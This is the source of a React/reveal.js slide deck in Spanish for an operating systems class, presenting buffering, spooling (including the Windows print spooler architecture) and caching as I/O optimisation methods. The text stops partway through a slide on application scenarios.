import { Deck, Slide, Stack, Code } from "@revealjs/react";
import RevealHighlight from "reveal.js/plugin/highlight";
import React from "react";
import { motion } from "framer-motion";
import {
  Zap,
  Layers,
  RotateCcw,
  ShieldAlert,
  Cpu,
  Database,
  HardDrive,
  Clock,
  ArrowRight,
  Activity,
  Printer,
  Network,
  Globe,
  Server,
  AlignCenter,
} from "lucide-react";

import "reveal.js/reveal.css";
import "reveal.js/theme/dracula.css";
import "reveal.js/plugin/highlight/monokai.css";

interface MechanismProps {
  label: string;
  description: string;
  icon?: React.ReactNode;
}

const MechanismCard: React.FC<MechanismProps> = ({
  label,
  description,
  icon,
}) => (
  <motion.div
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    viewport={{ once: true }}
    style={{
      textAlign: "left",
      background: "rgba(255,255,255,0.03)",
      padding: "1.5rem",
      borderRadius: "12px",
      border: "1px solid rgba(255,255,255,0.05)",
    }}
  >
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: "1rem",
        marginBottom: "0.8rem",
      }}
    >
      {icon && <div style={{ color: "var(--accent-buf)" }}>{icon}</div>}
      <span
        style={{
          color: "var(--accent-buf)",
          fontFamily: "var(--mono)",
          fontSize: "1.1rem",
          fontWeight: "700",
        }}
      >
        {label}
      </span>
    </div>
    <p
      style={{
        margin: 0,
        fontSize: "1.4rem !important",
        color: "var(--subtext)",
      }}
    >
      {description}
    </p>
  </motion.div>
);

export default function App() {
  return (
    <>
      <style>{`
        :root {
          --bg: #06080f;
          --bg-dark: #06080f;
          --gray1: #1c212c;
          --gray2: #232a36;
          --line: #313342;
          --fg: #f3f6f9;
          --subtext: #A1AABB;
          --muted: #8394A3;
          --accent-buf: #7fb4ca;
          --accent-spool: #deba87;
          --accent-cache: #b7cc85;
          --accent-red: #cb7c94;
          --accent-gold: #e0c15a;
          --mono: 'IBM Plex Mono', monospace;
          --serif: 'Source Serif 4', serif;
        }
        body {
          background-color: var(--bg) !important;
        }
        .reveal {
          background-color: var(--bg) !important;
        }
        .reveal .controls { color: var(--accent-buf) !important; }
        .reveal .progress { height: 6px !important; background: rgba(255,255,255,0.1) !important; }
        .reveal .progress span { background: var(--accent-buf) !important; }
        
        .glass-card {
          background: rgba(28, 33, 44, 0.7) !important;
          backdrop-filter: blur(12px);
          border: 1px solid var(--line);
          border-radius: 24px;
          padding: 3rem;
          box-shadow: 0 20px 50px rgba(0,0,0,0.5);
          box-sizing: border-box !important;
        }

        .presenter-tag {
          font-family: var(--mono);
          font-size: 1.1rem;
          color: var(--accent-gold);
          letter-spacing: 0.15em;
          margin-bottom: 2rem;
          background: rgba(224, 193, 90, 0.1);
          padding: 0.5rem 1.5rem;
          display: inline-block;
          border-radius: 99px;
          border: 1px solid rgba(224, 193, 90, 0.2);
        }
        .technical-note {
          border-left: 4px solid var(--accent-buf);
          background: rgba(127, 180, 202, 0.05);
          padding: 1.5rem;
          margin-top: 1.5rem;
          text-align: left;
          border-radius: 0 12px 12px 0;
        }
        .reveal p, .reveal li, .reveal td {
          font-size: 2.2rem !important;
          line-height: 1.6 !important;
          color: var(--subtext);
        }
        .reveal h1, .reveal h2, .reveal h3, .reveal h4 {
          color: var(--fg) !important;
          text-transform: none !important;
          font-weight: 700 !important;
        }
        .reveal .metric-val {
          font-size: 2.5rem !important;
          font-weight: 800;
          font-family: var(--mono);
        }
        .reveal .metric-label {
          font-size: 1.1rem !important;
          font-family: var(--mono);
          text-transform: uppercase;
          letter-spacing: 0.1em;
          opacity: 0.7;
        }
        .grid-2 {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 3rem;
          align-items: center;
        }
        .grid-3 {
          display: grid;
          grid-template-columns: 1fr 1fr 1fr;
          gap: 2rem;
        }
        .metric-card {
          background: var(--gray2);
          padding: 1.5rem;
          border-radius: 16px;
          border: 1px solid var(--line);
        }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--line); border-radius: 4px; }
        
        .reveal .slides section {
          padding: 0 !important;
        }

        .timeline-item {
          display: flex;
          gap: 2rem;
          align-items: flex-start;
          padding: 1.5rem;
          border-radius: 16px;
          border: 1px solid var(--line);
          background: rgba(255,255,255,0.02);
        }
        .timeline-dot {
          width: 14px;
          height: 14px;
          border-radius: 50%;
          flex-shrink: 0;
          margin-top: 0.6rem;
        }
        .era-badge {
          font-family: var(--mono);
          font-size: 0.75rem;
          padding: 0.25rem 0.75rem;
          border-radius: 99px;
          display: inline-block;
          margin-bottom: 0.5rem;
          font-weight: 700;
          letter-spacing: 0.15em;
        }
      `}</style>
      <Deck
        config={{
          hash: true,
          center: true,
          transition: "fade",
          transitionSpeed: "normal",
          width: 1920,
          height: 1080,
          margin: 0.05,
          minScale: 0.2,
          maxScale: 2.0,
          controls: true,
          progress: true,
        }}
        plugins={[RevealHighlight]}
      >
        {/* ── PORTADA ACADÉMICA ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              padding: "0 10%",
            }}
          >
            <motion.div
              initial={{ opacity: 0, x: -50 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8 }}
              style={{ textAlign: "left", position: "relative", zIndex: 1 }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "1rem",
                  marginBottom: "1.5rem",
                }}
              >
                <Cpu size={32} color="var(--accent-buf)" />
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.2rem",
                    color: "var(--accent-buf)",
                    letterSpacing: "0.4em",
                  }}
                >
                  SISTEMAS OPERATIVOS
                </span>
              </div>

              <h1
                style={{
                  fontSize: "7.5rem",
                  margin: "0.5rem 0 2rem 0",
                  fontWeight: "900",
                  letterSpacing: "-0.03em",
                  lineHeight: "0.95",
                }}
              >
                Métodos de Optimización
                <br />
                <span style={{ color: "var(--accent-gold)" }}>
                  De Entrada - Salida
                </span>
              </h1>

              <div
                style={{
                  height: "4px",
                  width: "120px",
                  background: "var(--accent-gold)",
                  marginBottom: "3.5rem",
                  borderRadius: "2px",
                }}
              ></div>

              <div className="presenter-tag">ALEX • LAURA • DIEGO</div>

              <p
                style={{
                  fontSize: "2.4rem !important",
                  maxWidth: "900px",
                  lineHeight: "1.4",
                  marginBottom: "4rem",
                  color: "var(--fg)",
                  fontFamily: "var(--serif)",
                  fontWeight: 300,
                }}
              >
                Optimización de throughput mediante{" "}
                <strong>Buffering, Spooling</strong> y <strong>Caching</strong>.
              </p>

              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: "2rem",
                  width: "100%",
                }}
              >
                <MechanismCard
                  icon={<Layers size={20} />}
                  label="01. BUFFERING"
                  description="Sincronización de flujos asíncronos."
                />
                <MechanismCard
                  icon={<RotateCcw size={20} />}
                  label="02. SPOOLING"
                  description="Virtualización de dispositivos exclusivos."
                />
                <MechanismCard
                  icon={<Activity size={20} />}
                  label="03. CACHING"
                  description="Localidad heurística de datos."
                />
              </div>
            </motion.div>

            <div
              style={{
                position: "absolute",
                top: "10%",
                right: "5%",
                width: "400px",
                height: "400px",
                background: "var(--accent-buf)",
                filter: "blur(150px)",
                opacity: 0.05,
                borderRadius: "50%",
              }}
            ></div>
          </div>
        </Slide>

        {/* ── FUNDAMENTACIÓN CONCEPTUAL ── */}
        <Slide data-transition="zoom">
          <div
            style={{
              height: "100%",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              padding: "0 10%",
            }}
          >
            <div
              style={{
                maxWidth: "1600px",
                margin: "0 auto",
                textAlign: "left",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "1.5rem",
                  marginBottom: "2rem",
                }}
              >
                <Database size={40} color="var(--accent-gold)" />
                <span
                  style={{
                    color: "var(--accent-gold)",
                    fontFamily: "var(--mono)",
                    fontSize: "1.2rem",
                    letterSpacing: "0.2em",
                  }}
                >
                  INTRODUCCIÓN TEÓRICA
                </span>
              </div>

              <h2
                style={{
                  fontSize: "5.5rem",
                  marginBottom: "4rem",
                  lineHeight: "1.1",
                }}
              >
                1. Fundamentación Conceptual
              </h2>

              <div
                className="grid-2"
                style={{ gap: "6rem", alignItems: "start" }}
              >
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "3rem",
                  }}
                >
                  <p
                    style={{
                      fontSize: "2.4rem !important",
                      lineHeight: "1.6",
                      color: "var(--fg)",
                      fontFamily: "var(--serif)",
                      fontWeight: 300,
                    }}
                  >
                    La gestión de entrada/salida (E/S) constituye uno de los
                    subsistemas críticos en la arquitectura de sistemas
                    operativos contemporáneos. Según{" "}
                    <strong>Holcombe (2023)</strong>, el subsistema de E/S
                    representa la interfaz definitiva entre el núcleo y los
                    dispositivos periféricos.
                  </p>

                  <div
                    className="technical-note"
                    style={{
                      borderColor: "var(--accent-red)",
                      background: "rgba(203, 124, 148, 0.05)",
                    }}
                  >
                    <p style={{ fontSize: "2rem !important", margin: 0 }}>
                      La <strong>"brecha de velocidad"</strong> (speed gap) es
                      el motor arquitectónico que justifica la existencia de
                      estos mecanismos (Univ. de Cambridge, 2022-2023).
                    </p>
                  </div>
                </div>

                <div
                  className="glass-card"
                  style={{
                    padding: "4rem",
                    borderLeft: "8px solid var(--accent-gold)",
                  }}
                >
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      lineHeight: "1.5",
                      marginBottom: "3rem",
                      fontStyle: "italic",
                    }}
                  >
                    "La optimización de E/S no es meramente una mejora de
                    rendimiento, sino un requisito arquitectónico para la
                    correctitud y eficiencia del sistema operativo."
                  </p>
                  <div
                    style={{
                      borderTop: "1px solid var(--line)",
                      paddingTop: "2rem",
                    }}
                  >
                    <span
                      style={{
                        fontFamily: "var(--mono)",
                        color: "var(--accent-gold)",
                        fontSize: "1.2rem",
                      }}
                    >
                      — Teoría de Jerarquías de Memoria
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── TAXONOMÍA DEL GAP DE VELOCIDAD ── */}
        <Slide data-transition="zoom">
          <div style={{ padding: "0 8%" }}>
            <div style={{ textAlign: "left", marginBottom: "4rem" }}>
              <span
                style={{
                  color: "var(--accent-red)",
                  fontFamily: "var(--mono)",
                  fontSize: "1.1rem",
                  letterSpacing: "0.2em",
                }}
              >
                01 · RENDIMIENTO DEL SISTEMA
              </span>
              <h2 style={{ fontSize: "4.5rem", marginTop: "0.5rem" }}>
                El problema de la Latencia
              </h2>
            </div>

            <div className="grid-2">
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "1.5rem",
                }}
              >
                {[
                  {
                    label: "Registros CPU / L1",
                    val: "~1 ns",
                    color: "var(--accent-cache)",
                    icon: <Cpu size={24} />,
                    power: "10⁰",
                  },
                  {
                    label: "Memoria Principal DRAM",
                    val: "~100 ns",
                    color: "var(--accent-gold)",
                    icon: <Database size={24} />,
                    power: "10²",
                  },
                  {
                    label: "Almacenamiento NVMe SSD",
                    val: "~100 μs",
                    color: "var(--accent-buf)",
                    icon: <Zap size={24} />,
                    power: "10⁵",
                  },
                  {
                    label: "HDD Legado / Red",
                    val: "~10 ms",
                    color: "var(--accent-red)",
                    icon: <HardDrive size={24} />,
                    power: "10⁷",
                  },
                ].map((item, i) => (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -30 }}
                    whileInView={{ opacity: 1, x: 0 }}
                    transition={{ delay: i * 0.1 }}
                    className="metric-card"
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      borderLeft: `4px solid ${item.color}`,
                    }}
                  >
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1.5rem",
                      }}
                    >
                      <div style={{ color: item.color }}>{item.icon}</div>
                      <div>
                        <div className="metric-label">{item.label}</div>
                        <div
                          className="metric-val"
                          style={{ color: item.color }}
                        >
                          {item.val}
                        </div>
                      </div>
                    </div>
                    <div style={{ textAlign: "right", opacity: 0.4 }}>
                      <div
                        style={{
                          fontSize: "0.7rem",
                          fontFamily: "var(--mono)",
                        }}
                      >
                        MAGNITUD
                      </div>
                      <div style={{ fontSize: "2rem", fontWeight: 800 }}>
                        {item.power}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>

              <div className="glass-card" style={{ padding: "3.5rem" }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "1.5rem",
                  }}
                >
                  <ShieldAlert
                    size={48}
                    color="var(--accent-red)"
                    style={{ flexShrink: 0 }}
                  />
                  <div>
                    <h4 style={{ fontSize: "2.5rem", marginBottom: "1.5rem" }}>
                      Impacto Arquitectónico
                    </h4>
                    <p
                      style={{
                        fontSize: "2.2rem !important",
                        lineHeight: "1.4",
                      }}
                    >
                      Esta disparidad de <strong>7 órdenes de magnitud</strong>{" "}
                      implica que la CPU pasa el 99.9% de sus ciclos en{" "}
                      <code>I/O WAIT</code> sin capas de abstracción.
                    </p>
                    <div
                      style={{
                        marginTop: "2.5rem",
                        display: "flex",
                        flexDirection: "column",
                        gap: "1rem",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Desacoplamiento Productor-Consumidor
                        </span>
                      </div>
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Independencia de Dispositivo (VFS)
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── BUFFERING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%" }}>
              <div
                className="glass-card"
                style={{ borderLeft: "12px solid var(--accent-buf)" }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "3rem",
                  }}
                >
                  <div>
                    <span
                      className="presenter-tag"
                      style={{
                        background: "rgba(127, 180, 202, 0.1)",
                        color: "var(--accent-buf)",
                      }}
                    >
                      MECANISMO 01 // BUFFERING
                    </span>
                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>
                      Acoplamiento de Velocidades
                    </h2>
                  </div>
                  <Layers
                    size={80}
                    color="var(--accent-buf)"
                    style={{ opacity: 0.2 }}
                  />
                </div>

                <div className="grid-2" style={{ gap: "4rem" }}>
                  <div style={{ textAlign: "left" }}>
                    <h4
                      style={{
                        color: "var(--accent-buf)",
                        fontSize: "2.5rem",
                        marginBottom: "2rem",
                      }}
                    >
                      Tres Razones Fundamentales (Cambridge, 2023):
                    </h4>
                    <ul
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "1.5rem",
                      }}
                    >
                      <li>
                        <strong>Discrepancia de Velocidad:</strong> Sincroniza
                        productor y consumidor.
                      </li>
                      <li>
                        <strong>Adaptación de Tamaño:</strong> Gestiona
                        distintos bloques de transferencia.
                      </li>
                      <li>
                        <strong>Semántica de Copia:</strong> Protege la
                        integridad de E/S de aplicaciones.
                      </li>
                    </ul>
                  </div>
                  <div
                    className="metric-card"
                    style={{ background: "rgba(255,255,255,0.02)" }}
                  >
                    <p
                      style={{
                        fontSize: "2rem !important",
                        fontStyle: "italic",
                        borderLeft: "4px solid var(--accent-gold)",
                        paddingLeft: "1.5rem",
                      }}
                    >
                      "Región de almacenamiento temporal en RAM para absorber
                      diferencias de velocidad sin bloqueos mutuos."
                    </p>
                    <div
                      style={{
                        marginTop: "2rem",
                        display: "flex",
                        gap: "1rem",
                        opacity: 0.6,
                      }}
                    >
                      <span
                        className="presenter-tag"
                        style={{ fontSize: "0.8rem" }}
                      >
                        VOLÁTIL
                      </span>
                      <span
                        className="presenter-tag"
                        style={{ fontSize: "0.8rem" }}
                      >
                        NANOSEGUNDOS
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide data-transition="convex-in concave-out">
            <div style={{ padding: "0 10%" }}>
              <div style={{ textAlign: "left", marginBottom: "4rem" }}>
                <span
                  style={{
                    color: "var(--accent-gold)",
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                  }}
                >
                  E/S DE NUEVA GENERACIÓN
                </span>
                <h2 style={{ fontSize: "4.5rem" }}>Evolución: io_uring</h2>
                <p style={{ fontSize: "2.2rem", color: "var(--accent-buf)" }}>
                  Eficiencia Asíncrona con Cero Syscalls
                </p>
              </div>
              <div className="grid-2" style={{ marginTop: "3rem" }}>
                <div className="technical-note">
                  <h4 style={{ marginBottom: "1rem" }}>
                    Submission Queue (SQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    Las apps envían descriptores a anillos mapeados en memoria.{" "}
                    <strong>Sin cambios de contexto.</strong>
                  </p>
                </div>
                <div
                  className="technical-note"
                  style={{ borderColor: "var(--accent-gold)" }}
                >
                  <h4 style={{ marginBottom: "1rem" }}>
                    Completion Queue (CQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    El Kernel notifica resultados asíncronamente.{" "}
                    <strong>Procesamiento por lotes</strong> extremo.
                  </p>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── SPOOLING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "3rem",
                }}
              >
                <RotateCcw size={60} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "5rem", margin: 0 }}>
                  Desacoplamiento Arquitectónico
                </h2>
              </div>

              <div className="grid-2" style={{ gap: "4rem", alignItems: "stretch" }}>
                <div className="glass-card" style={{ textAlign: "left", display: "flex", flexDirection: "column" }}>
                  <h3
                    style={{ color: "var(--accent-spool)", fontSize: "2.5rem" }}
                  >
                    Spooling vs Buffering
                  </h3>
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      marginTop: "1.5rem",
                      flexGrow: 1
                    }}
                  >
                    A diferencia del buffer, el <strong>Spooling</strong>{" "}
                    utiliza el disco como un buffer masivo para gestionar{" "}
                    <strong>trabajos completos</strong> destinados a
                    dispositivos exclusivos.
                  </p>
                  <div
                    className="technical-note"
                    style={{
                      borderColor: "var(--accent-spool)",
                      background: "rgba(222, 186, 135, 0.05)",
                      fontSize: "1.8rem",
                      marginTop: "auto"
                    }}
                  >
                    <strong>Persistencia:</strong> Sobrevive a fallos de energía
                    (Acceso en ms).
                  </div>
                </div>

                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                  }}
                >
                  <div className="glass-card" style={{ height: "100%", display: "flex", flexDirection: "column" }}>
                    <h4 style={{ fontSize: "2.2rem", color: "var(--fg)", marginBottom: "1.5rem" }}>Componentes (Microsoft Learn)</h4>
                    <div
                      style={{
                        marginTop: "1rem",
                        display: "flex",
                        flexDirection: "column",
                        justifyContent: "center",
                        gap: "1.5rem",
                        flexGrow: 1
                      }}
                    >
                      <li style={{ fontSize: "2rem !important", listStyle: "none", display: "flex", alignItems: "center", gap: "1rem" }}>
                        <span style={{ color: "var(--accent-spool)" }}>•</span> <code>spoolsv.exe</code>
                      </li>
                      <li style={{ fontSize: "2rem !important", listStyle: "none", display: "flex", alignItems: "center", gap: "1rem" }}>
                        <span style={{ color: "var(--accent-spool)" }}>•</span> Procesador de Impresión
                      </li>
                      <li style={{ fontSize: "2rem !important", listStyle: "none", display: "flex", alignItems: "center", gap: "1rem" }}>
                        <span style={{ color: "var(--accent-spool)" }}>•</span> Interfaz de Control
                      </li>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide data-transition="slide-in fade-out">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div style={{ marginBottom: "3rem" }}>
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                    color: "var(--accent-spool)",
                    letterSpacing: "0.2em",
                  }}
                >
                  SPOOLING // COMPONENTES DEL SISTEMA
                </span>
                <h2 style={{ fontSize: "4.5rem", margin: "0.5rem 0 0 0" }}>
                  Arquitectura del Spooler (Win32)
                </h2>
              </div>

              <div className="grid-3" style={{ gap: "1.5rem" }}>
                <div className="glass-card" style={{ padding: "2rem" }}>
                  <h2 style={{ fontSize: "2.2rem", color: "var(--accent-spool)", marginBottom: "1rem" }}>1. spoolsv.exe</h2>
                  <p style={{ textAlign: "left", fontSize: "1.4rem !important", margin: "0 0 1rem 0", color: "var(--fg)" }}><strong>Proceso anfitrión</strong> que intercepta cada solicitud de impresión.</p>
                  <ul style={{ fontSize: "1.1rem !important", paddingLeft: "1.2rem", color: "var(--subtext)" }}>
                    <li style={{ marginBottom: "0.5rem" }}>Crea archivos <code>.SHD</code> y <code>.SPL</code>.</li>
                    <li style={{ marginBottom: "0.5rem" }}>Mantiene la cola tras fallos.</li>
                    <li>Rutea al procesador adecuado.</li>
                  </ul>
                </div>

                <div className="glass-card" style={{ padding: "2rem" }}>
                  <h2 style={{ fontSize: "2.2rem", color: "var(--accent-spool)", marginBottom: "1rem" }}>2. Procesador</h2>
                  <p style={{ textAlign: "left", fontSize: "1.4rem !important", margin: "0 0 1rem 0", color: "var(--fg)" }}>Motor de renderizado y <strong>traductor de formatos</strong> software/hardware.</p>
                  <ul style={{ fontSize: "1.1rem !important", paddingLeft: "1.2rem", color: "var(--subtext)" }}>
                    <li style={{ marginBottom: "0.5rem" }}>Transforma <strong>EMF</strong> a <strong>RAW</strong>.</li>
                    <li style={{ marginBottom: "0.5rem" }}>Gestiona N-up y orden inverso.</li>
                    <li>Permite el "término" virtual.</li>
                  </ul>
                </div>

                <div className="glass-card" style={{ padding: "2rem" }}>
                  <h2 style={{ fontSize: "2.2rem", color: "var(--accent-spool)", marginBottom: "1rem" }}>3. Interfaz</h2>
                  <p style={{ textAlign: "left", fontSize: "1.4rem !important", margin: "0 0 1rem 0", color: "var(--fg)" }}>Capa de software (<code>Winspool.drv</code>) de administración y control.</p>
                  <ul style={{ fontSize: "1.1rem !important", paddingLeft: "1.2rem", color: "var(--subtext)" }}>
                    <li style={{ marginBottom: "0.5rem" }}>Supervisa ciclo de vida (Pausa/Canc).</li>
                    <li style={{ marginBottom: "0.5rem" }}>Valida permisos ACL de cola.</li>
                    <li>Canaliza feedback del hardware.</li>
                  </ul>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>
        {/* ── CACHING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%" }}>
              <div
                className="glass-card"
                style={{ borderLeft: "12px solid var(--accent-cache)" }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "3rem",
                  }}
                >
                  <div>
                    <span
                      className="presenter-tag"
                      style={{
                        background: "rgba(183,204,133,0.1)",
                        color: "var(--accent-cache)",
                      }}
                    >
                      MECANISMO 03 // CACHING
                    </span>
                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>
                      Localidad de Referencia
                    </h2>
                  </div>
                  <Activity
                    size={80}
                    color="var(--accent-cache)"
                    style={{ opacity: 0.2 }}
                  />
                </div>

                <div className="grid-2" style={{ gap: "4rem" }}>
                  <div style={{ textAlign: "left" }}>
                    <h4
                      style={{
                        color: "var(--accent-cache)",
                        fontSize: "2.5rem",
                        marginBottom: "2rem",
                      }}
                    >
                      Dos Principios Fundamentales:
                    </h4>
                    <ul
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "1.5rem",
                      }}
                    >
                      <li>
                        <strong>Localidad Temporal:</strong> Un dato accedido
                        recientemente probablemente se accederá de nuevo pronto.
                        La caché lo retiene en memoria rápida.
                      </li>
                      <li>
                        <strong>Localidad Espacial:</strong> Los datos cercanos
                        en dirección a un dato accedido también serán
                        probablemente accedidos. Se cargan bloques completos, no
                        bytes individuales.
                      </li>
                    </ul>
                  </div>
                  <div
                    className="metric-card"
                    style={{ background: "rgba(255,255,255,0.02)" }}
                  >
                    <p
                      style={{
                        fontSize: "2rem !important",
                        fontStyle: "italic",
                        borderLeft: "4px solid var(--accent-gold)",
                        paddingLeft: "1.5rem",
                      }}
                    >
                      "Una caché es una copia de un dato que ya existe en otro
                      lugar, mantenida en un medio más rápido para reducir la
                      latencia de acceso."
                    </p>
                    <div
                      style={{
                        marginTop: "2rem",
                        display: "flex",
                        gap: "1rem",
                        flexWrap: "wrap",
                      }}
                    >
                      <span
                        className="presenter-tag"
                        style={{ fontSize: "0.8rem" }}
                      >
                        HIT RATE
                      </span>
                      <span
                        className="presenter-tag"
                        style={{ fontSize: "0.8rem" }}
                      >
                        MISS PENALTY
                      </span>
                      <span
                        className="presenter-tag"
                        style={{ fontSize: "0.8rem" }}
                      >
                        COLD START
                      </span>
                    </div>
                    <div
                      className="technical-note"
                      style={{
                        marginTop: "1.5rem",
                        borderColor: "var(--accent-cache)",
                      }}
                    >
                      <strong>Diferencia clave con Buffer:</strong> el buffer es
                      el único lugar del dato durante la transferencia. La caché
                      es una copia — el original sigue existiendo en disco.
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── MATRIZ COMPARATIVA ── */}
        <Slide
          data-background-iframe="./comparativa.html"
          data-background-interactive
          data-transition="fade"
        ></Slide>

        {/* ── ESCENARIOS DE APLICACIÓN ── */}
        <Slide data-transition="convex">
          <div
            style={{
              padding: "0 5%",
              textAlign: "left",
              height: "100%",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
            }}
          >
            <div style={{ marginBottom: "2rem" }}>
              <span
                style={{
                  color: "var(--accent-gold)",
                  fontFamily: "var(--mono)",
                  fontSize: "1.1rem",
                  letterSpacing: "0.2em",
                }}
              >
                EL MUNDO REAL
              </span>
              <h2 style={{ fontSize: "5rem", margin: 0 }}>
                Escenarios de Aplicación
              </h2>
            </div>
            <div
              style={{
                display: "grid",
                gridTemplateColumns: "repeat(3, 1fr)",
                gap: "1rem",
                alignItems: "stretch",
                width: "100%",
                boxSizing: "border-box",
              }}
            >
              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-buf)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <Zap size={24} color="var(--accent-buf)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-buf)",
                    }}
                  >
                    Buffering
                  </h3>
                </div>
                <ul
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "0.6rem",
                    fontSize: "1.2rem !important",
                    textAlign: "left",
                    margin: 0,
                    paddingLeft: "1.1rem",
                    flexGrow: 1,
                    overflowWrap: "anywhere",
                    wordBreak: "normal",
                  }}
                >
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-buf)" }}>•</span>{" "}
                    <strong>Streaming:</strong> Precarga en RAM para compensar
                    jitter (QoS).
                  </li>
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-buf)" }}>•</span>{" "}
                    <strong>Redes:</strong> Gestión de colas activas y control
                    de congestión.
                  </li>
                </ul>
              </div>

              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-spool)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <RotateCcw size={24} color="var(--accent-spool)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-spool)",
                    }}
                  >
                    Spooling
                  </h3>
                </div>
                <ul
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "0.6rem",
                    fontSize: "1.2rem !important",
                    textAlign: "left",
                    margin: 0,
                    paddingLeft: "1.1rem",
                    flexGrow: 1,
                    overflowWrap: "anywhere",
                    wordBreak: "normal",
                  }}
                >
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-spool)" }}>•</span>{" "}
                    <strong>Impresión:</strong> Interceptación a disco para
                    serializar trabajos.
                  </li>
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-spool)" }}>•</span>{" "}
                    <strong>Lotes:</strong> Colas masivas asíncronas sin bloqueo
                    de procesos.
                  </li>
                </ul>
              </div>

              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-cache)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <Activity size={24} color="var(--accent-cache)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-cache)",
                    }}
                  >
                    Caching
                  </h3>
                </div>
                <ul
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "0.6rem",
                    fontSize: "1.2rem !important",
                    textAlign: "left",
                    margin: 0,
                    paddingLeft: "1.1rem",
                    flexGrow: 1,
